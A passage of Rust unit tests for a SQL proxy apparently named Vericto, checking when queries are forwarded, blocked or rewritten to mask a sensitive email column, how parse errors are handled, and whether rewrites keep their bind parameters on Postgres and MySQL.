            TcpDecision::Block { .. } => panic!("a Low/Monitor query must Forward, not Block"),
        }
    }

    // A query that matches no rule must Forward with no observation (Allow).
    #[test]
    fn allow_decision_forwards_without_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate(
            "SELECT id FROM users WHERE id = 1 LIMIT 10",
            Dialect::Postgres,
            &rules,
            &policy,
        );
        match decision {
            TcpDecision::Forward { observation, .. } => assert!(
                observation.is_none(),
                "a clean query must not carry an observation"
            ),
            TcpDecision::Block { .. } => panic!("a clean query must Forward, not Block"),
        }
    }

    // Parse error, fail-open (default AllowReport) → Forward + parse-error Observation.
    #[test]
    fn parse_error_fail_open_forwards_with_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate("NOT A VALID SQL @@@", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.rule_code, "VERICTO-PARSE-ERROR");
                assert_eq!(obs.action, EnforcementAction::Flag);
                assert_eq!(obs.severity, Severity::Medium);
                assert!(obs.parse_error.is_some());
            }
            _ => panic!("parse-error fail-open must Forward with a parse-error observation"),
        }
    }

    fn tags(json: serde_json::Value) -> EnforcementPolicy {
        EnforcementPolicy {
            sensitive_columns: serde_json::from_value(json).unwrap(),
            ..EnforcementPolicy::default()
        }
    }

    fn mask_email() -> EnforcementPolicy {
        tags(serde_json::json!([
            {"table": "customers", "column": "email", "policy": "mask", "mask_style": "email"}
        ]))
    }

    /// With a block or mask tag, a parse error blocks even under the fail-open
    /// default: the proxy must use `effective_parse_error`, not `parse_error`.
    #[test]
    fn parse_error_with_a_block_or_mask_tag_blocks() {
        for policy in [
            mask_email(),
            tags(serde_json::json!([{"table": "t", "column": "c", "policy": "block"}])),
        ] {
            assert_eq!(policy.parse_error, ParseErrorAction::AllowReport);
            match evaluate(
                "NOT A VALID SQL @@@",
                Dialect::Postgres,
                &default_ruleset(),
                &policy,
            ) {
                TcpDecision::Block { rule_code, .. } => {
                    assert_eq!(rule_code, "VERICTO-PARSE-ERROR")
                }
                TcpDecision::Forward { .. } => {
                    panic!("a parse error must block with a protective tag")
                }
            }
        }
    }

    /// Flag-only tags keep the workspace's fail-open choice.
    #[test]
    fn parse_error_with_only_flag_tags_still_forwards() {
        let policy = tags(serde_json::json!([{"table": "t", "column": "c", "policy": "flag"}]));
        match evaluate(
            "NOT A VALID SQL @@@",
            Dialect::Postgres,
            &default_ruleset(),
            &policy,
        ) {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.rule_code, "VERICTO-PARSE-ERROR")
            }
            _ => panic!("flag-only tags must not change parse-error handling"),
        }
    }

    #[test]
    fn postgres_mask_forwards_the_rewrite_and_the_touched_columns() {
        let d = evaluate(
            "SELECT email FROM customers LIMIT 1",
            Dialect::Postgres,
            &default_ruleset(),
            &mask_email(),
        );
        let TcpDecision::Forward {
            rewritten_query: Some(sql),
            sensitive_columns,
            observation,
            ..
        } = d
        else {
            panic!("a successful mask forwards the rewritten query");
        };
        assert!(sql.contains("regexp_replace"), "{sql}");
        assert_eq!(sensitive_columns.len(), 1);
        assert_eq!(sensitive_columns[0].policy, SensitivePolicy::Mask);
        assert_eq!(observation.unwrap().rule_code, SENSITIVE_RULE_CODE);
    }

    /// Engine 3.7.0 rewrites a MySQL mask too: the proxy forwards the rewrite
    /// (it used to block every MySQL mask with "no rewrite for mysql yet").
    #[test]
    fn mysql_mask_forwards_the_rewrite() {
        for kind in [QueryKind::Simple, QueryKind::Prepared] {
            let d = evaluate_message(
                "SELECT id, email FROM customers WHERE id = ? LIMIT 1",
                Dialect::Mysql,
                kind,
                &default_ruleset(),
                &mask_email(),
            );
            let TcpDecision::Forward {
                rewritten_query: Some(sql),
                sensitive_columns,
                observation,
                ..
            } = d
            else {
                panic!("a successful MySQL mask forwards the rewritten query ({kind:?})");
            };
            assert!(!sql.contains("SELECT id, email FROM"), "{sql}");
            assert_eq!(mysql_placeholders(&sql), Some(1), "{sql}");
            assert_eq!(sensitive_columns.len(), 1);
            assert_eq!(sensitive_columns[0].policy, SensitivePolicy::Mask);
            assert_eq!(observation.unwrap().rule_code, SENSITIVE_RULE_CODE);
        }
    }

    /// A MySQL mask the engine cannot rewrite (`*` over a masked column) still
    /// blocks: there is no rewrite to forward, and the original would leak.
    #[test]
    fn mysql_mask_without_a_rewrite_blocks() {
        match evaluate(
            "SELECT * FROM customers LIMIT 1",
            Dialect::Mysql,
            &default_ruleset(),
            &mask_email(),
        ) {
            TcpDecision::Block {
                rule_code,
                sensitive_columns,
                ..
            } => {
                assert_eq!(rule_code, SENSITIVE_RULE_CODE);
                assert_eq!(sensitive_columns.len(), 1);
            }
            TcpDecision::Forward { .. } => panic!("`*` under mask must block"),
        }
    }

    fn touched(policy: SensitivePolicy) -> TouchedColumn {
        TouchedColumn {
            schema: None,
            table: "customers".into(),
            column: "email".into(),
            policy,
        }
    }

    /// Every outcome that leaves the proxy with only the original to forward
    /// is refused; the consistent ones are not.
    #[test]
    fn inconsistent_mask_outcomes_are_refused() {
        let plain = EnforcementPolicy::default();
        let monitor = EnforcementPolicy {
            monitor_mode: true,
            ..EnforcementPolicy::default()
        };
        let outcome = |rewritten: Option<&str>, cols: Vec<TouchedColumn>| {
            let mut o = EvaluationOutcome::allowed();
            o.decision = Decision::Flag;
            o.rewritten_query = rewritten.map(str::to_string);
            o.sensitive_columns = cols;
            o
        };
        let pg = Dialect::Postgres;
        let ok = outcome(
            Some("SELECT 'x' AS email"),
            vec![touched(SensitivePolicy::Mask)],
        );
        assert_eq!(rewrite_inconsistency(&ok, pg, &plain), None);
        // Mask read, no rewrite: the case the fail-safe exists for.
        let none = outcome(None, vec![touched(SensitivePolicy::Mask)]);
        assert!(rewrite_inconsistency(&none, pg, &plain).is_some());
        // ... except under monitor_mode, which never changes what runs.
        assert_eq!(rewrite_inconsistency(&none, pg, &monitor), None);
        // MySQL has a rewrite too (engine 3.7.0); Oracle and MS SQL do not.
        assert_eq!(rewrite_inconsistency(&ok, Dialect::Mysql, &plain), None);
        for d in [Dialect::Oracle, Dialect::MsSql] {
            assert!(rewrite_inconsistency(&ok, d, &plain).is_some(), "{d:?}");
        }
        // Without a masked column, empty, or with a NUL: on both dialects.
        for d in [pg, Dialect::Mysql] {
            assert!(rewrite_inconsistency(&none, d, &plain).is_some(), "{d:?}");
            assert_eq!(rewrite_inconsistency(&none, d, &monitor), None, "{d:?}");
            let unmasked = outcome(Some("SELECT 1"), vec![touched(SensitivePolicy::Flag)]);
            assert!(rewrite_inconsistency(&unmasked, d, &plain).is_some());
            for bad in ["", "  ", "SELECT 1\0"] {
                let o = outcome(Some(bad), vec![touched(SensitivePolicy::Mask)]);
                assert!(rewrite_inconsistency(&o, d, &plain).is_some(), "{bad:?}");
            }
            // Nothing masked, nothing rewritten: not this check's business.
            let flag = outcome(None, vec![touched(SensitivePolicy::Flag)]);
            assert_eq!(rewrite_inconsistency(&flag, d, &plain), None);
        }
    }

    fn limit_hit(outcome: PolicyOutcome) -> vericto_engine::policy::PolicyHit {
        vericto_engine::policy::PolicyHit {
            rule_id: "r-cap".into(),
            rule_code: "POL-CAP".into(),
            severity: Severity::Low,
            statement: 0,
            outcome,
            requested: vericto_engine::policy::PolicyAction::RewriteLimit,
            action: Some(EnforcementAction::Monitor),
            message: "agent reads are capped".into(),
            reason: None,
        }
    }

    /// Engine 4.5.0: a rewrite without a mask is accounted for by a
    /// `rewrite_limit` policy that bounded the statement, and by nothing else.
    #[test]
    fn a_limit_rewrite_is_consistent_only_with_a_rewritten_policy_hit() {
        let plain = EnforcementPolicy::default();
        let outcome = |hits: Vec<vericto_engine::policy::PolicyHit>| {
            let mut o = EvaluationOutcome::allowed();
            o.rewritten_query = Some("SELECT id FROM orders LIMIT 100".into());
            o.policy_hits = hits;
            o
        };
        for d in [Dialect::Postgres, Dialect::Mysql] {
            let bounded = outcome(vec![limit_hit(PolicyOutcome::Rewritten)]);
            assert_eq!(rewrite_inconsistency(&bounded, d, &plain), None, "{d:?}");
            for other in [Vec::new(), vec![limit_hit(PolicyOutcome::Violated)]] {
                assert!(rewrite_inconsistency(&outcome(other), d, &plain).is_some());
            }
            let mut empty = outcome(vec![limit_hit(PolicyOutcome::Rewritten)]);
            empty.rewritten_query = Some(" ".into());
            assert!(rewrite_inconsistency(&empty, d, &plain).is_some());
        }
        for d in [Dialect::Oracle, Dialect::MsSql] {
            let bounded = outcome(vec![limit_hit(PolicyOutcome::Rewritten)]);
            assert!(
                rewrite_inconsistency(&bounded, d, &plain).is_some(),
                "{d:?}"
            );
        }
    }

    /// Without policies (`evaluate()`, policy rules off) there are no hits, so
    /// the always-on path refuses a rewrite without a mask exactly as 4.16.2.
    #[test]
    fn without_policies_no_select_is_rewritten() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        for d in [Dialect::Postgres, Dialect::Mysql] {
            match evaluate("SELECT id FROM orders", d, &rules, &policy) {
                TcpDecision::Forward {
                    rewritten_query, ..
                } => assert_eq!(rewritten_query, None, "{d:?}"),
                TcpDecision::Block { .. } => panic!("{d:?}: an unbounded read only flags"),
            }
        }
    }

    /// A LIMIT bound the proxy cannot enforce blocks under the policy's code; a
    /// mask (with or without a bound on top) stays VERICTO-085.
    #[test]
    fn an_unenforceable_rewrite_is_blocked_under_whoever_asked_for_it() {
        let rewritten = "SELECT id FROM orders LIMIT 100";
        let violations = || {
            vec![ReportedViolation {
                rule_id: "r-cap".into(),
                rule_code: "POL-CAP".into(),
                severity: Severity::Low,
                action: EnforcementAction::Monitor,
                ast_node_path: "Policy > POL-CAP: agent reads are capped [LIMIT 100]".into(),
                estimated_rows_affected: None,
                suggested_safe_query: Some(rewritten.into()),
            }]
        };
        let code = |d: TcpDecision| match d {
            TcpDecision::Block {
                rule_code,
                ast_node_path,
                ..
            } => (rule_code, ast_node_path),
            TcpDecision::Forward { .. } => panic!("must block"),
        };
        let (c, path) = code(rewrite_not_enforceable(
            "why",
            Some(rewritten),
            violations(),
            Vec::new(),
            Vec::new(),
        ));
        assert_eq!(c, "POL-CAP");
        assert!(path.contains("LIMIT rewrite not enforceable") && path.contains("why"));
        let (c, _) = code(rewrite_not_enforceable(
            "why",
            Some(rewritten),
            violations(),
            vec![touched(SensitivePolicy::Mask)],
            Vec::new(),
        ));
        assert_eq!(c, SENSITIVE_RULE_CODE);
        let (c, _) = code(rewrite_not_enforceable(
            "why",
            None,
            violations(),
            Vec::new(),
            Vec::new(),
        ));
        assert_eq!(c, SENSITIVE_RULE_CODE);
    }

    #[test]
    fn a_rewrite_must_keep_every_parameter() {
        assert_eq!(
            parameter_mismatch(
                "SELECT email FROM t WHERE id = $1",
                "SELECT 'x' AS email FROM t WHERE id = $1",
                Dialect::Postgres
            ),
            None
        );
        let lost = parameter_mismatch(
            "SELECT substring(card, $1, 4) FROM t WHERE id = $2",
            "SELECT '[redacted]'::text AS substring FROM t WHERE id = $2",
            Dialect::Postgres,
        )
        .unwrap();
        assert!(lost.contains("$1") && !lost.contains("$2"), "{lost}");
        assert!(parameter_mismatch("SELECT 1", "SELECT $1", Dialect::Postgres).is_some());
    }

    /// MySQL `?` placeholders are counted as the server counts them: not inside
    /// a string, a quoted identifier or a comment.
    #[test]
    fn mysql_placeholders_are_counted_like_the_server() {
        assert_eq!(mysql_placeholders("SELECT 1"), Some(0));
        assert_eq!(
            mysql_placeholders("SELECT email FROM t WHERE id = ? AND n > ?"),
            Some(2)
        );
        assert_eq!(
            mysql_placeholders(
                "SELECT '?', \"?\", `?` FROM t /* ? */ WHERE a = ? -- ?\n AND b = 'x\\'?' # ?"
            ),
            Some(1)
        );
        // Unterminated string: cannot be counted, so cannot be vouched for.
        assert_eq!(mysql_placeholders("SELECT 'abc"), None);
    }

    /// The server answers a COM_STMT_PREPARE with the statement's parameter
    /// count, and the client binds that many values on COM_STMT_EXECUTE. A
    /// rewrite that changes the count is refused.
    #[test]
    fn a_mysql_rewrite_must_keep_the_parameter_count() {
        let my = Dialect::Mysql;
        assert_eq!(
            parameter_mismatch(
                "SELECT email FROM t WHERE id = ?",
                "SELECT CONCAT(LEFT(email, 1), '***') AS email FROM t WHERE id = ?",
                my
            ),
            None
        );
        let lost = parameter_mismatch(
            "SELECT SUBSTRING(card, ?, 4) FROM t WHERE id = ?",
            "SELECT '[redacted]' AS `SUBSTRING(card, ?, 4)` FROM t WHERE id = ?",
            my,
        );
        // The `?` inside the quoted alias is not a parameter: 2 → 1.
        let lost = lost.expect("a lost parameter is refused");
        assert!(lost.contains("2") && lost.contains("1"), "{lost}");
        assert!(parameter_mismatch("SELECT 1", "SELECT ?", my).is_some());
        assert!(parameter_mismatch("SELECT ?", "SELECT 'unterminated", my).is_some());
    }

    /// The `?` check on a COM_STMT_PREPARE blocks with VERICTO-085 and a
    /// message; a COM_QUERY, which has no parameters to bind, is not checked.
    #[test]
    fn a_mysql_prepare_whose_rewrite_loses_a_parameter_is_blocked() {
        let forward = || TcpDecision::Forward {
            observation: None,
            violations: Vec::new(),
            rewritten_query: Some("SELECT '[redacted]' AS c FROM t".to_string()),
            sensitive_columns: vec![touched(SensitivePolicy::Mask)],
            access_denied: Vec::new(),
        };
        let sql = "SELECT SUBSTRING(card, ?, 4) AS c FROM t";
        match checked_for_kind(forward(), sql, Dialect::Mysql, QueryKind::Prepared) {
            TcpDecision::Block {
                rule_code,
                ast_node_path,
                sensitive_columns,
                ..
            } => {
                assert_eq!(rule_code, SENSITIVE_RULE_CODE);
                assert!(ast_node_path.contains("parameter"), "{ast_node_path}");
                assert_eq!(sensitive_columns.len(), 1);
            }
            TcpDecision::Forward { .. } => panic!("a lost `?` must block"),
        }
        assert!(matches!(
            checked_for_kind(forward(), sql, Dialect::Mysql, QueryKind::Simple),
            TcpDecision::Forward {
                rewritten_query: Some(_),
                ..
            }
        ));
    }

    /// A masked expression over a bind parameter keeps the parameter (engine
    /// 3.6.1), so a Parse is forwarded rewritten, like a simple query. The
    /// parameter check stays as a safety net (`parameter_mismatch` above).
    #[test]
    fn a_masked_parameter_is_kept_on_parse_and_simple_query() {
        let sql = "SELECT substring(email, $1, 4) FROM customers LIMIT 1";
        let rules = default_ruleset();
        let policy = mask_email();
        match evaluate_message(sql, Dialect::Postgres, QueryKind::Prepared, &rules, &policy) {
            TcpDecision::Forward {
                rewritten_query: Some(q),
                ..
            } => assert!(q.contains("$1"), "{q}"),
            _ => panic!("expected a rewritten Forward"),
        }
        assert!(matches!(
            evaluate_message(sql, Dialect::Postgres, QueryKind::Simple, &rules, &policy),
            TcpDecision::Forward {
                rewritten_query: Some(_),
                ..
            }
        ));
    }

    // Parse error, fail-closed (Block) → Block with VERICTO-PARSE-ERROR.
    #[test]
    fn parse_error_fail_closed_blocks() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy {
            parse_error: ParseErrorAction::Block,
            ..EnforcementPolicy::default()
        };
        let decision = evaluate("NOT A VALID SQL @@@", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Block { rule_code, .. } => {
                assert_eq!(rule_code, "VERICTO-PARSE-ERROR");
            }
            TcpDecision::Forward { .. } => {
                panic!("parse-error fail-closed must Block, not Forward")
            }
        }
    }
}
